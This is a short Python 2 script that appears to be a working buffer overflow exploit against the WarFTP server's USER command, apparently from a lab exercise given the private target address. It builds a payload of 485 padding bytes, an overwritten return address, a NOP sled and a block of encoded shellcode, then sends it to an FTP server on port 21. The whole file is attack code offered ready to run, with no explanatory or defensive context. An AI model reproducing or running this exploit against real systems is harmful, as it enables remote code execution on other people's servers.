#!/usr/bin/python

import socket
import time

#[*] Exact match at offset 485
buffer = "A" * 485

eip = "\x4B\xAB\x4C\x5F"

nops = "\x90" * 16
buf =  ""
buf += "\x6a\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13"
buf += "\xd1\xf8\xf9\x3d\x83\xeb\xfc\xe2\xf4\x2d\x10\x7b\x3d"
buf += "\xd1\xf8\x99\xb4\x34\xc9\x39\x59\x5a\xa8\xc9\xb6\x83"
buf += "\xf4\x72\x6f\xc5\x73\x8b\x15\xde\x4f\xb3\x1b\xe0\x07"
buf += "\x55\x01\xb0\x84\xfb\x11\xf1\x39\x36\x30\xd0\x3f\x1b"
buf += "\xcf\x83\xaf\x72\x6f\xc1\x73\xb3\x01\x5a\xb4\xe8\x45"
buf += "\x32\xb0\xf8\xec\x80\x73\xa0\x1d\xd0\x2b\x72\x74\xc9"
buf += "\x1b\xc3\x74\x5a\xcc\x72\x3c\x07\xc9\x06\x91\x10\x37"
buf += "\xf4\x3c\x16\xc0\x19\x48\x27\xfb\x84\xc5\xea\x85\xdd"
buf += "\x48\x35\xa0\x72\x65\xf5\xf9\x2a\x5b\x5a\xf4\xb2\xb6"
buf += "\x89\xe4\xf8\xee\x5a\xfc\x72\x3c\x01\x71\xbd\x19\xf5"
buf += "\xa3\xa2\x5c\x88\xa2\xa8\xc2\x31\xa7\xa6\x67\x5a\xea"
buf += "\x12\xb0\x8c\x90\xca\x0f\xd1\xf8\x91\x4a\xa2\xca\xa6"
buf += "\x69\xb9\xb4\x8e\x1b\xd6\x07\x2c\x85\x41\xf9\xf9\x3d"
buf += "\xf8\x3c\xad\x6d\xb9\xd1\x79\x56\xd1\x07\x2c\x6d\x81"
buf += "\xa8\xa9\x7d\x81\xb8\xa9\x55\x3b\xf7\x26\xdd\x2e\x2d"
buf += "\x6e\x57\xd4\x90\x39\x95\xd1\x52\x91\x3f\xd1\xf8\xa9"
buf += "\xb4\x37\x92\xe9\x6b\x86\x90\x60\x98\xa5\x99\x06\xe8"
buf += "\x54\x38\x8d\x31\x2e\xb6\xf1\x48\x3d\x90\x09\x88\x73"
buf += "\xae\x06\xe8\xb9\x9b\x94\x59\xd1\x71\x1a\x6a\x86\xaf"
buf += "\xc8\xcb\xbb\xea\xa0\x6b\x33\x05\x9f\xfa\x95\xdc\xc5"
buf += "\x3c\xd0\x75\xbd\x19\xc1\x3e\xf9\x79\x85\xa8\xaf\x6b"
buf += "\x87\xbe\xaf\x73\x87\xae\xaa\x6b\xb9\x81\x35\x02\x57"
buf += "\x07\x2c\xb4\x31\xb6\xaf\x7b\x2e\xc8\x91\x35\x56\xe5"
buf += "\x99\xc2\x04\x43\x09\x88\x73\xae\x91\x9b\x44\x45\x64"
buf += "\xc2\x04\xc4\xff\x41\xdb\x78\x02\xdd\xa4\xfd\x42\x7a"
buf += "\xc2\x8a\x96\x57\xd1\xab\x06\xe8"


leftovers = "C" * 15
string = buffer + eip + nops + buf + leftovers

print "Blasting WarFTP User with %s Bytes" %len(string)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.0.107', 21))
s.recv(1024)
s.send('USER ' + string + '\r\n')
s.send('QUIT\r\n')
s.close()

